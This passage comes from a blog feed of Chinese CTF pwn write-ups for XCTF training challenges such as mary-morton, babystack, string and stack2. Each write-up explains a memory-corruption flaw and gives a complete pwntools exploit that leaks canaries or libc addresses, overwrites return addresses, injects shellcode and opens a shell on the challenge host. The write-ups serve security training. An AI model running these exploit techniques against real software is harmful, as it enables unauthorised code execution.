class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-mary-morton</title>
      <link href="/ctf-pwn/9dff28e7.html"/>
      <url>/ctf-pwn/9dff28e7.html</url>
      
        <content type="html"><![CDATA[<p><em>最后完成月2023年9月4号</em></p><p>泄漏canary地址<br>存在canary保护<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724083626.png" style="zoom:80%;" /> </p><p>存在system<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724085322.png"  style="zoom:80%;" /></p><p>程序大致的逻辑就是选择一个选项，然后输入，存在两处输入输出，使用了read和printf，第一处中read无法溢出，但是printf存在格式化字符串漏洞，可以组合泄露出canary的地址<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724083831.png" alt="0" style="zoom:80%;" /></p><p>在函数sub_400960，read函数可以溢出，可以通过之前泄漏的canary值来构造payload<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724084040.png" style="zoom:80%;" /></p><p>通过printf泄漏canary的地址，但是在泄漏地址时没有注意%x是输出一个八字节的数，而我算偏移的时候按照单字节算了，而且也没有考虑输入的数据在栈中的偏移，直接拿输入和canary的相对偏移来作为绝对偏移。<br>通过格式化printf输出可以得到buf在栈中的偏移为6<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724084815.png" style="zoom:80%;" /><br>在栈中buf在0x90出，canary在0x8出，相距0x88，也就是136，在64位环境下，%X输出8字节，136&#x2F;8&#x3D;17,17+6&#x3D;23，因此canary在栈中的偏移为23。<br>完整exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process("./mary_morton")</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">60921</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">b"%23$p"</span>sys_addr <span class="token operator">=</span> <span class="token number">0x4008DA</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"3. Exit the battle"</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>canary<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"3. Exit the battle"</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-反应釜开关</title>
      <link href="/ctf-pwn/c42410d2.html"/>
      <url>/ctf-pwn/c42410d2.html</url>
      
        <content type="html"><![CDATA[<p>(简单的栈溢出)<br>checksec查看附件如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904210354.png" style="zoom:80%;" /><br>开启了内存不可执行以及部分重定位. 直接运行本程序, 如图所示, 题目中直接给出了一个地址, 不知道能不能利用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211159.png" style="zoom:80%;" /><br>用IDA打开附件查看, 逻辑比较清晰, 其中有<code>system(&#39;/bin/sh&#39;)</code>, 而且有<code>gets</code>函数, 可以直接溢出然后跳转执行.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211836.png" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211856.png" style="zoom:80%;" /><br><code>v5</code>长度为512, 构造payload<code>b&#39;a&#39; * 512 + b&#39;a&#39; * 8 + p64(shell_addr)</code><br>完整exp如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process('./fanyin')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">51859</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./fanyin'</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x4005F6</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">512</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-pwn1</title>
      <link href="/ctf-pwn/1bdd2aa8.html"/>
      <url>/ctf-pwn/1bdd2aa8.html</url>
      
        <content type="html"><![CDATA[<p>checksec检查<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230817212438.png"  style="zoom:50%;" /><br>除了PIE外所有保护全开.<br>程序的大致逻辑是一个输入输出, 先将输入存储到缓冲区, 然后再输出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210031.png"  style="zoom: 80%;" /></p><p>IDA打开后程序的主逻辑如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210914.png"  style="zoom: 80%;" /><br>程序中没有发现<code>system</code>函数以及<code>bin/sh</code>等, 只有<code>read</code>, <code>puts</code>, <code>write</code>. 附件中给出了<code>libc</code>, <code>libc</code>中有可利用的<code>execve</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902211303.png"  style="zoom: 80%;" /><br>大致思路是要通过主程序去泄漏出<code>libc</code>的基地址, 然后通过libc中的<code>execve</code>去get shell.<br>因为开启了canary, 首先要去找到canary的值, 由于输入值和canary的值在栈中相邻, 因此可以通过puts函数泄漏出canray的值.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902212752.png"  style="zoom: 80%;" /><br>可以第一步输入<code>&#39;a&#39; * 0x88</code>, 然后第二步输出时泄漏canary的地址. 但是因为在发送<code>&#39;a&#39; * 0x88</code>时会在末尾追加<code>\n</code>, 因此会将canary低位的<code>\x00</code>覆盖掉, 所以还要还原.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214043.png"  style="zoom:50%;" /><br>在得到canary的值后, 就需要去泄漏出libc的基地址. 因为程序中有使用到<code>puts</code>函数, 所以通过调用<code>puts</code>函数去计算出<code>puts</code>函数的地址, 然后通过<code>plt</code>, <code>got</code>表的调用关系去计算出libc的基地址. 然后再算出运行时<code>execve</code>的地址, 来进行调用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214739.png"   /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token comment"># sh = process('./babystack')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">49628</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>execve_addr <span class="token operator">=</span> <span class="token number">0x45216</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> <span class="token number">0x400908</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400A93</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token comment">#通过覆盖掉\x00来使得puts泄漏出canary</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#将末尾的0xa替换回来</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"canary value : 0x%x"</span> <span class="token operator">%</span> canary<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>payload_1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span>  \ p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token comment">#利用puts函数输出puts函数的地址</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>put_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts address : 0x%x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>put_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> put_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#计算基地址</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> execve_addrsh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token comment">#跳转到getshell</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-string</title>
      <link href="/ctf-pwn/6d40db96.html"/>
      <url>/ctf-pwn/6d40db96.html</url>
      
        <content type="html"><![CDATA[<p><em>最后修改于2023年9月4日</em></p><p>main函数中直接打印了v4的地址<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715234012.png" style="zoom:80%;" /><br>在函数sub_400BB9中，存在格式化字符串漏洞<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715234740.png" style="zoom:80%;" /></p><p>在函数sub_400CA6中，*a1其实就是最开始的v4，如果v41==v42 ,就会执行输入的字节码。mmap函数开辟内存空间后将指针传递给v1，</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">((void (__fastcall *)(_QWORD))v1)(0LL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这段代码将v1转换为一个&#x3D;&#x3D;函数指针&#x3D;&#x3D;</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230715234931.png" style="zoom:80%;" /><p>综上，只要是v41 &#x3D; v42 即可执行shellcode从而getshell。<br>在<code>sub_400BB9</code>函数中存在格式化字符串漏洞，且在最开始会打印出v4的地址，因此在sub_400BB9中<code>Give me an address</code>时，可以输入v4的地址，然后通过格式化字符串漏洞进行修改。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment"># from ctypes import*</span><span class="token comment"># libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("61.147.171.105", 59440)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./1d3c852354df4609bf8e56fe8e9df316'</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> <span class="token number">0x804855A</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">,</span> <span class="token string">b"east"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"go into there(1), or leave(0)?:"</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">85</span> <span class="token operator">+</span> <span class="token string">b'%7$n'</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment"># shellcode =  '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"USE YOU SPELL"</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span><span class="token comment"># gdb.attach(sh)</span><span class="token comment"># pause()</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-stack2</title>
      <link href="/ctf-pwn/440df70f.html"/>
      <url>/ctf-pwn/440df70f.html</url>
      
        <content type="html"><![CDATA[<p><em>完成于2023年8月2日</em></p><p><em>最后修改于2023年9月4日</em></p><p>checksec检查<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802153857.png" style="zoom:80%;" /></p><p>有栈保护 </p><p>程序主体是一个计算平均数的计算器，存在漏洞的点是数组越界，没有对数组下标进行限制，所有可以对任意地址进行修改<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802155519.png" style="zoom:80%;" /></p><p>该程序中存在<code>system(&quot;/bin/bash)</code>，所以可以利用数组越界去修改函数返回地址，来getshell。<br>只要得到<code>main</code>函数的返回地址在栈中与数组的偏移就可以进行修改。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230802160711.png" style="zoom:80%;" /><br>在ida中查看main函数的stack，数组距离main返回地址的偏移为0x70+4 -&gt; 0x74(&#x3D;&#x3D;好像和canary有关&#x3D;&#x3D;)<br>在调试过程中，确定main函数的返回地址与数据首地址的偏移。</p><p>确定偏移后，就可以利用了，但是在本题中无法直接使用<code>system(&#39;/bin/sh&#39;)</code>,需要重新构造一下。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230803145720.png" style="zoom:80%;" /><br>可以把<code>/bin/bash</code>截断，将<code>sh</code>传给system利用<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230803153602.png" style="zoom:80%;" /><br><code>sh</code>从87开始<br><code>system</code> 可以直接利用<code>call system</code>的地址，也就是<code>0x080485B4</code><br>完整exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process("./stack2")</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"5. exit"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"which number to change"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-guess_num</title>
      <link href="/ctf-pwn/a1902526.html"/>
      <url>/ctf-pwn/a1902526.html</url>
      
        <content type="html"><![CDATA[<p>通过IDA打开附件后，其中有srand随机数函数，当随机数种子变时，无论生成多少次随机数，所产生的随机数序列都是相同的。<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714100108.png" style="zoom:50%;" /></p><p>使用gets()函数进行处理，可以进行溢出，且输入和seed在栈空间中是连续的，在输入时，覆盖到seed[0] 即可</p><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230714141012.png" style="zoom:50%;" />gets获取到的输入与seed数组在栈中是连续的，gets长度为32，因此构造payload为<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token string">b'1000'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中“1000”，是设置的随机数种子，在输入过程中，“1000”是按字符形式读取的，所以在生成时该数为“0x30303031”</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;time.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;cstdlib></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0x30303031u</span><span class="token punctuation">;</span>    <span class="token function">srand</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> number <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        cout<span class="token operator">&lt;&lt;</span>number<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//在Linux下进行编译</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成随机数：6235463161</p><p>python脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token 